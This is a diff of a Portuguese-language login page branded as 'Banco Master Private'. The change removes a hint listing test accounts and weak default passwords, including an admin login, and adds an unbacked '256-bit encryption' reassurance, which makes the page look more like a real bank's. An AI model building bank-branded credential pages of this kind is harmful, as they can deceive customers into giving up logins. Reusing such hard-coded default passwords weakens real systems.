@@ -13,19 +13,15 @@ body{background:#0a0a0a;color:#fff;display:flex;min-height:100vh}
 .hero h1 span{color:#c9a86a}
 .hero p{color:#888;max-width:420px;line-height:1.6}
 .card-preview{margin-top:40px;background:linear-gradient(135deg,#1a1a1a,#0f0f0f);border:1px solid #222;border-radius:20px;padding:24px;width:360px}
-.card-preview.top{display:flex;justify-content:space-between;color:#c9a86a;font-size:12px;letter-spacing:.2em}
-.card-preview.num{margin:40px 0 20px;font-size:20px;letter-spacing:.3em}
-.card-preview.bottom{display:flex;justify-content:space-between;color:#666;font-size:11px}
 .right{flex:1;background:#fafaf9;display:flex;align-items:center;justify-content:center;padding:40px}
 .box{width:100%;max-width:360px}
 .box h2{color:#111;font-size:28px;margin-bottom:8px}
-.box.sub{color:#888;font-size:14px;margin-bottom:32px}
+.box .sub{color:#888;font-size:14px;margin-bottom:32px}
 input{width:100%;padding:14px 16px;border:1px solid #e5e5e5;border-radius:12px;margin-bottom:14px;background:#fff;color:#111;outline:none}
 input:focus{border-color:#c9a86a}
 button{width:100%;padding:14px;background:#111;color:#fff;border:0;border-radius:12px;font-weight:600;cursor:pointer;margin-top:8px}
 button:hover{background:#000}
-.hint{margin-top:24px;background:#f5f5f4;border-radius:12px;padding:12px;font-size:12px;color:#666;line-height:1.5}
-.hint b{color:#111}
+.foot{margin-top:32px;color:#aaa;font-size:11px;text-align:center}
 </style>
 </head>
 <body>
@@ -34,29 +30,19 @@ button:hover{background:#000}
 <div class="hero">
 <h1>Seu patrimônio.<br><span>Sem fricção.</span></h1>
 <p>Banco Master Private. Conta internacional, cartão Black e PIX ilimitado em uma experiência 100% criptografada.</p>
-<div class="card-preview">
-<div class="top"><span>MASTER BLACK</span><span>•••</span></div>
-<div class="num">•••• 0001 000001</div>
-<div class="bottom"><span>AG 0001</span><span>PRIVATE</span></div>
 </div>
-</div>
-<div style="color:#444;font-size:11px">© 2026 Banco Master S.A. • CNPJ 00.000.000/0001-00</div>
+<div style="color:#444;font-size:11px">© 2026 Banco Master S.A.</div>
 </div>
 <div class="right">
 <div class="box">
 <h2>Bem-vindo de volta</h2>
 <div class="sub">Acesse sua conta Private</div>
 <form method="POST" action="/login">
-<input name="username" placeholder="Usuário (ex: cliente01 ou admin)" required>
-<input name="password" type="password" placeholder="Senha" required>
+<input name="username" placeholder="Usuário" required autocomplete="off">
+<input name="password" type="password" placeholder="Senha" required autocomplete="new-password">
 <button type="submit">Entrar no Private →</button>
 </form>
-<div class="hint">
-<b>Acesso de teste:</b><br>
-Usuário: cliente01 até cliente50<br>
-Senha: Master@01<br><br>
-Admin: admin / Master@2026
-</div>
+<div class="foot">Ambiente seguro • Criptografia de 256 bits</div>
 </div>
 </div>
 </div>
